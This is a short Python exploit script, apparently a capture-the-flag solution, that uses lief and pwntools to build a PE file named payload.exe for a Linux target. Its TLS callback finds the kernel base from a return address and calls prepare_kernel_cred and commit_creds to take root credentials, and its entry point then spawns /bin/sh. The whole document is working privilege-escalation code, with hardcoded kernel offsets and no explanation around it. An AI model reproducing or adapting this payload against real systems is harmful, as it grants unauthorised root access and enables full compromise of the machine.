# Creates exploit PE file (latest lief is kinda broken so i use an older version i believe)
from lief import PE
from pwn import *
context.arch = "amd64"
context.os = "linux"

main = """
mov rax, 59
lea rdi, [0x402000]
lea rsi, [rip+argv]
mov rdx, 0
syscall

mov rax, 60
mov rdi, 0
syscall

argv:
.quad 0x402000
.quad 0
"""

tls_callback = """
push rbx
mov rbx, [rsp+8] # rbx <- return address
sub rbx, 0x381a07 # rbx <- kernel base
mov rdi, rbx
add rdi, 0xc0c940 # rdi <- &init_task
mov rax, rbx
add rax, 0xa76a0 # rax <- prepare_kernel_cred
call rax # rax <- new_creds = prepare_kernel_cred(&init_task)
mov rdi, rax # rdi <- new_creds
mov rax, rbx
add rax, 0xa7490 # rax <- commit_creds
call rax # commit_creds(new_creds)
pop rbx
ret
"""

code = asm(main).ljust(0x100, b"\x90")
code += asm(tls_callback)

# 0x402000
datab = b"/bin/sh".ljust(0x20, b"\x00")

# 0x402000 + 0x20 = 0x402020
datab += p64(0) # Raw data start
datab += p64(0) # Raw data end
datab += p64(0) # Address of index
datab += p64(0x402050) # Address of callbacks
datab += p32(0) # Size of zero fill
datab += p32(0) # Characteristics
datab += p64(0) # Padding

# 0x402020 + 0x30 = 0x402050
datab += p64(0x401100)  # TLS Callback
datab += p64(0)         # End of TLS Callbacks

# Create a new PE binary
binary = PE.Binary("payload", PE.PE_TYPE.PE32_PLUS)

# Add a new section
text_section = PE.Section(".text")
text_section.virtual_address = 0x1000
text_section.content = list(code)

data_section = PE.Section(".data")
data_section.virtual_address = 0x2000
data_section.content = list(datab)

text_section = binary.add_section(text_section, PE.SECTION_TYPES.TEXT)
data_section = binary.add_section(data_section, PE.SECTION_TYPES.DATA)

binary.optional_header.addressof_entrypoint = text_section.virtual_address

binary.data_directories[9].rva = 0x2020
binary.data_directories[9].size = 0x28

print(binary)

# Write the binary to disk
builder = PE.Builder(binary)
builder.build_imports(True)
builder.build()
builder.write("payload.exe")